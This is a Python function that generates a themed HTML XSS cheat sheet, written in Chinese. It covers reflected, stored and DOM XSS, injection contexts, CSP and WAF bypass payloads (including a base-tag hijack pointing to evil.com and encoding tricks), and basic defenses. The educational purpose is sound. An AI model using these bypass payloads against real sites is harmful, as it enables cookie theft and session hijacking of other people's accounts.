# XSS知识库HTML内容生成器

def get_knowledge_html(theme='light'):
    """
    根据主题生成XSS知识库的HTML内容

    Args:
        theme: 'light' 或 'dark'

    Returns:
        HTML字符串
    """
    if theme == 'dark':
        colors = {
            'bg': '#202020',
            'text': '#E4E4E4',
            'text2': '#A0A0A0',
            'h2': '#C2C2C2',
            'h3': '#E4E4E4',
            'border': '#C2C2C2',
            'code_bg': '#2D2D2D',
            'code_text': '#E6A8A0',
            'tip_bg': '#2A2A2A',
            'tip_border': '#C2C2C2',
            'warn_bg': '#3A2826',
            'warn_border': '#EFA593',
            'link': '#CBB99A',
        }
    else:  # light
        colors = {
            'bg': '#FFFFFF',
            'text': '#303133',
            'text2': '#606266',
            'h2': '#374151',
            'h3': '#303133',
            'border': '#374151',
            'code_bg': '#f5f7fa',
            'code_text': '#F56C6C',
            'tip_bg': '#E7F5FF',
            'tip_border': '#374151',
            'warn_bg': '#FEF0F0',
            'warn_border': '#F56C6C',
            'link': '#409EFF',
        }

    return f"""
    <style>
        body {{
            font-size: 13px;
            background: {colors['bg']};
            color: {colors['text']};
        }}
        h2 {{
            color: {colors['h2']};
            margin-top: 20px;
            font-size: 18px;
            font-weight: 400;
        }}
        h3 {{
            color: {colors['h3']};
            margin-top: 15px;
            border-left: 4px solid {colors['border']};
            padding-left: 10px;
            font-size: 13px;
            font-weight: 400;
        }}
        p {{
            font-size: 13px;
            line-height: 1.8;
            color: {colors['text']};
        }}
        ul, ol {{
            font-size: 13px;
            line-height: 1.8;
            color: {colors['text']};
        }}
        li {{
            margin: 8px 0;
        }}
        .code {{
            background: {colors['code_bg']};
            padding: 3px 8px;
            border-radius: 3px;
            font-family: Consolas;
            color: {colors['code_text']};
            font-size: 13px;
        }}
        .tip {{
            background: {colors['tip_bg']};
            padding: 15px;
            border-left: 4px solid {colors['tip_border']};
            margin: 15px 0;
            font-size: 13px;
            line-height: 1.8;
            color: {colors['text']};
        }}
        .warn {{
            background: {colors['warn_bg']};
            padding: 15px;
            border-left: 4px solid {colors['warn_border']};
            margin: 15px 0;
            font-size: 13px;
            line-height: 1.8;
            color: {colors['text']};
        }}
        a {{
            color: {colors['link']};
        }}
        b {{
            color: {colors['text']};
        }}
    </style>

    <h2>XSS完整知识库</h2>

    <h3>一、XSS三大类型</h3>

    <p><b>1. 反射型XSS (Reflected XSS)</b></p>
    <ul>
        <li><b>特点：</b>payload在URL参数中，服务器直接反射到页面</li>
        <li><b>触发：</b>需要诱使用户点击恶意链接</li>
        <li><b>示例：</b><span class="code">?search=&lt;script&gt;alert(1)&lt;/script&gt;</span></li>
        <li><b>危害：</b>窃取Cookie、钓鱼、会话劫持</li>
    </ul>

    <p><b>2. 存储型XSS (Stored XSS)</b></p>
    <ul>
        <li><b>特点：</b>payload被保存到数据库，持久化存在</li>
        <li><b>触发：</b>其他用户访问该页面时自动触发</li>
        <li><b>示例：</b>评论、留言板、用户资料</li>
        <li><b>危害：</b>影响范围大，所有访问者都会中招</li>
    </ul>

    <p><b>3. DOM型XSS (DOM-based XSS)</b></p>
    <ul>
        <li><b>特点：</b>完全在客户端执行，不经过服务器</li>
        <li><b>触发：</b>通过JavaScript操作DOM导致</li>
        <li><b>示例：</b><span class="code">document.write(location.hash)</span></li>
        <li><b>危害：</b>难以检测，WAF无法防护</li>
    </ul>

    <div class="tip">
    <b>DOM XSS挖掘方法</b><br><br>
    <b>1. 寻找危险Source（数据来源）：</b><br>
    • <span class="code">location.hash</span> / <span class="code">location.search</span> / <span class="code">location.href</span><br>
    • <span class="code">document.referrer</span> / <span class="code">document.URL</span><br>
    • <span class="code">window.name</span> / <span class="code">postMessage</span><br><br>

    <b>2. 寻找危险Sink（数据使用点）：</b><br>
    • <span class="code">eval()</span> / <span class="code">setTimeout()</span> / <span class="code">setInterval()</span><br>
    • <span class="code">Function()</span> / <span class="code">document.write()</span><br>
    • <span class="code">innerHTML</span> / <span class="code">outerHTML</span> / <span class="code">insertAdjacentHTML</span><br>
    • <span class="code">location</span> / <span class="code">location.href</span> (赋值)<br>
    • <span class="code">element.src</span> / <span class="code">element.href</span><br><br>

    <b>3. 挖掘步骤：</b><br>
    ① 打开浏览器开发者工具 → Sources标签<br>
    ② 搜索关键词：<span class="code">location.hash</span>, <span class="code">innerHTML</span>, <span class="code">eval</span><br>
    ③ 追踪数据流：Source → 处理 → Sink<br>
    ④ 测试：在URL中插入payload，如<span class="code">#&lt;img src=x onerror=alert(1)&gt;</span><br>
    ⑤ 观察是否执行<br><br>

    <b>4. 实战示例：</b><br>
    <span class="code">var keyword = location.hash.substr(1);<br>
    document.getElementById('search').innerHTML = keyword;</span><br>
    → 访问：<span class="code">page.html#&lt;img src=x onerror=alert(1)&gt;</span><br><br>

    <b>5. 自动化工具：</b><br>
    • DOM Invader (Burp Suite扩展)<br>
    • DOMPurify (测试过滤器)<br>
    • 手动审计：Chrome DevTools + 搜索危险函数
    </div>

    <h3>二、常见注入点与场景</h3>

    <p><b>1. HTML标签属性注入</b></p>
    <ul>
        <li><b>场景：</b><span class="code">&lt;input value="用户输入"&gt;</span></li>
        <li><b>payload：</b><span class="code">" onclick="alert(1)</span></li>
        <li><b>结果：</b><span class="code">&lt;input value="" onclick="alert(1)"&gt;</span></li>
    </ul>

    <p><b>2. JavaScript上下文注入</b></p>
    <ul>
        <li><b>场景：</b><span class="code">&lt;script&gt;var name='用户输入';&lt;/script&gt;</span></li>
        <li><b>payload：</b><span class="code">'; alert(1); //</span></li>
        <li><b>结果：</b>闭合引号后执行代码</li>
    </ul>

    <p><b>3. HTML事件处理器注入</b></p>
    <ul>
        <li><b>场景：</b><span class="code">&lt;img src="用户输入"&gt;</span></li>
        <li><b>payload：</b><span class="code">x" onerror="alert(1)</span></li>
        <li><b>触发：</b>图片加载失败时执行</li>
    </ul>

    <p><b>4. URL注入</b></p>
    <ul>
        <li><b>场景：</b><span class="code">&lt;a href="用户输入"&gt;</span></li>
        <li><b>payload：</b><span class="code">javascript:alert(1)</span></li>
        <li><b>变种：</b><span class="code">data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span></li>
    </ul>

    <div class="warn">
    <b>⚠️ CSP绕过技巧</b><br><br>
    <b>1. 利用白名单CDN：</b><br>
    • JSONP端点：<span class="code">&lt;script src="https://example.com/jsonp?callback=alert"&gt;</span><br>
    • Angular库：<span class="code">ng-app</span> + <span class="code">{{{{constructor.constructor('alert(1)')()}}}}</span><br><br>

    <b>2. base标签劫持：</b><br>
    • <span class="code">&lt;base href="http://evil.com/"&gt;</span> 劫持相对路径<br><br>

    <b>3. 利用浏览器解析差异：</b><br>
    • IE: <span class="code">&lt;script&gt;/*&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;*/&lt;/script&gt;</span><br>
    • Safari: <span class="code">&lt;iframe src="javascript:&amp;#x61;lert(1)"&gt;</span>
    </div>

    <h3>三、WAF绕过技巧</h3>

    <p><b>1. 大小写混淆</b></p>
    <ul>
        <li><span class="code">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</span></li>
        <li><span class="code">&lt;iMg sRc=x OnErRoR=alert(1)&gt;</span></li>
    </ul>

    <p><b>2. 双写绕过</b></p>
    <ul>
        <li><span class="code">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</span></li>
    </ul>

    <p><b>3. 编码绕过</b></p>
    <ul>
        <li>HTML实体编码：<span class="code">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span></li>
        <li>十六进制：<span class="code">&lt;img src=x onerror=&amp;#x61;lert(1)&gt;</span></li>
        <li>命名实体：<span class="code">&lt;input onfocus="alert&amp;lpar;1&amp;rpar;"&gt;</span>（<span class="code">&amp;lpar;</span>=( <span class="code">&amp;rpar;</span>=) <span class="code">&amp;apos;</span>=' <span class="code">&amp;semi;</span>=;）</li>
        <li>URL编码：<span class="code">%3Cscript%3Ealert(1)%3C/script%3E</span></li>
    </ul>

    <div class="warn">
    <b>⚠️ 实体编码的上下文限制</b><br><br>
    HTML实体编码（数字实体 <span class="code">&amp;#97;</span> 与命名实体 <span class="code">&amp;lpar;</span>）<b>只在 HTML 属性值上下文被浏览器解码</b>，例如事件处理器 <span class="code">&lt;input onfocus="alert&amp;lpar;1&amp;rpar;"&gt;</span> 可正常执行。<br><br>
    但在 <span class="code">&lt;script&gt;</span> 标签内部<b>不会被解码</b>，<span class="code">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&lt;/script&gt;</span> 会被当作普通文本，无法执行。<br><br>
    伪协议编码（<span class="code">data:</span>/<span class="code">javascript:</span>）仅适用于可填 URL 的属性，如 <span class="code">src</span>、<span class="code">href</span>。
    </div>

    <h3>四、防御措施</h3>

    <p><b>1. 输入过滤</b></p>
    <ul>
        <li>使用白名单：只允许字母、数字</li>
        <li>HTML实体编码：<span class="code">&amp;lt;</span> → <span class="code">&lt;</span></li>
    </ul>

    <p><b>2. CSP策略</b></p>
    <ul>
        <li><span class="code">Content-Security-Policy: default-src 'self'</span></li>
    </ul>

    <p><b>3. HttpOnly Cookie</b></p>
    <ul>
        <li>JavaScript无法读取：<span class="code">document.cookie</span> 失效</li>
    </ul>

    <h3>五、学习资源</h3>
    <ul>
        <li><a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger XSS教程</a></li>
        <li><a href="https://github.com/payloadbox/xss-payload-list">XSS Payload大全</a></li>
        <li><a href="https://xss-game.appspot.com/">Google XSS Game</a></li>
        <li><a href="https://excess-xss.com/">Excess XSS教程</a></li>
    </ul>
    """
